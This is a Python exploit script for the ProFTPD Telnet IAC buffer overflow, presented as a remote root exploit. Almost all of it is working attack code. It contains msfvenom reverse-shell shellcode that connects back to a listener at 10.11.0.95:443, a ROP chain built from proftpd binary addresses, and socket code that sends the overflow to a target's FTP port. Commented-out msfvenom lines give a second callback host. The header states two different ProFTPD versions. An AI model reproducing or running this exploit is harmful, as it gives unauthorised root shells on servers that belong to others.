#!/usr/bin/env python
#
###################################################################################################
#                                                  #                                              #
#  Vulnerability: ProFTPD IAC Remote Root Exploit  #  Telnet IAC Buffer Overflow (Linux)          #
#                                                  #  ProFTPD 1.3.2rc3                            #
#  Vulnerable Application: ProFTPD 1.3.3a          #  This is a part of the Metasploit Module,    #
#  Tested on Linux 2.6.32-5-686                    #  exploit/linux/ftp/proftp_telnet_iac         #
#                                                  #                                              #
#  Author: Muhammad Haidari                        #  Spawns a reverse shell to 10.11.0.95:443    #
#  Contact: ghmh@outlook.com                       #                                              #
#  Website: www.github.com/muhammd                 #                                              #
#                                                  #                                              #
###################################################################################################
#
#
# Usage: python ProFTPD_exploit.py <Remote IP Address>

import sys
import socket
import struct

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.95 LPORT=443 EXITFUNC=thread \
#     PrependChrootBreak=true --smallest -f python -b '\x09\x0a\x0b\x0c\x0d\x20\xff'
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.68 LPORT=4455 EXITFUNC=thread PrependChrootBreak=true --smallest -f python -b '\x09\x0a\x0b\x0c\x20'

payload = (
    ""
    "\x6a\x1d\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
    "\xcd\x0d\xb5\xca\x83\xeb\xfc\xe2\xf4\xfc\xc4\x84\x11"
    "\xa7\x4b\xed\x07\x4d\x67\x88\x43\x2e\x67\x92\x92\x00"
    "\x8d\x3c\x13\x95\xc0\x35\xfb\x0d\x5d\xd3\xa2\xe3\x23"
    "\x3c\x29\xa7\x30\xec\x7a\xc1\xc0\x35\x28\x37\x67\x88"
    "\x43\x14\x55\x78\x4a\xfc\xd6\x42\x29\x9e\x4e\xe6\xa0"
    "\xcf\x84\x54\x7a\xab\xc0\x35\x59\x94\xbd\x8a\x07\x4d"
    "\x44\xcc\x33\xa5\x07\xbe\xca\x89\x65\xb7\xca\xdc\x6a"
    "\x3c\x2b\x7d\x6b\xe5\x9b\x9e\xbe\xb6\x43\x2c\xc0\x35"
    "\x98\xa5\x63\x9a\xb9\xa5\x65\x9a\xe5\xaf\x64\x3c\x29"
    "\x9f\x5e\x3c\x2b\x7d\x06\x78\x4a"
#    '\x6a\x1d\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x77\x29\x9a'
#    '\x30\x83\xeb\xfc\xe2\xf4\x46\xe0\xab\xeb\x1d\x6f\xc2\xfd\xf7\x43'
#    '\xa7\xb9\x94\x43\xbd\x68\xba\xa9\x13\xe9\x2f\xe4\x1a\x01\xb7\x79'
#    '\xfc\x58\x59\x07\x13\xd3\x1d\x14\xc3\x80\x7b\xe4\x1a\xd2\x8d\x43'
#    '\xa7\xb9\xae\x71\x57\xb0\x46\xf2\x6d\xd3\x24\x6a\xc9\x5a\x75\xa0'
#    '\x7b\x80\x11\xe4\x1a\xa3\x2e\x99\xa5\xfd\xf7\x60\xe3\xc9\x1f\x23'
#    '\x91\x30\x28\x41\x98\x30\x76\x92\x13\xd1\xc7\x4f\xca\x61\x24\x9a'
#    '\x99\xb9\x96\xe4\x1a\x62\x1f\x47\xb5\x43\x1f\x41\xb5\x1f\x15\x40'
#    '\x13\xd3\x25\x7a\x13\xd1\xc7\x22\x57\xb0'
)

# NOTE: All addresses are from the proftpd binary
IACCount = 4096 + 16
Offset = 0x102c - 4
Ret = '0x805a547'       # pop esi / pop ebp / ret
Writable = '0x80e81a0'  # .data

if len(sys.argv) < 2:
    print('\nUsage: %s <HOST>\n' % (sys.argv[0]))
    sys.exit()

rop = struct.pack('<L', 0xcccccccc)  # unused
# mov eax,esi / pop ebx / pop esi / pop ebp / ret
rop += struct.pack('<L', 0x805a544)
rop += struct.pack('<L', 0xcccccccc)  # becomes ebx
rop += struct.pack('<L', 0xcccccccc)  # becomes esi
rop += struct.pack('<L', 0xcccccccc)  # becomes ebp

# quadruple deref the res pointer :)
for _ in range(4):
    rop += struct.pack('<L', 0x8068886)  # mov eax,[eax] / ret

# skip the pool chunk header
for _ in range(16):
    rop += struct.pack('<L', 0x805bd8e)  # inc eax / adc cl, cl / ret

# execute the data :)
rop += struct.pack('<L', 0x0805c26c)  # jmp eax

buf = 'SITE '
buf += payload

if len(buf) % 2 == 0:
    buf += 'B'
    print('Buffer was aligned')

buf += '\xff' * (IACCount - len(payload))
buf += '\x90' * (Offset - len(buf))
addrs = struct.pack('<L', 0x805a547)  # Ret
addrs += struct.pack('<L', 0x80e81a0)  # Writable
addrs += rop
buf += addrs
buf += '\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
s.recv(1024)
s.send(buf)
print('Payload Successfully Send...Check your Multi/Handler')
print('....Reverse shell is comming to you...')

print(s.recv(1024))
s.close()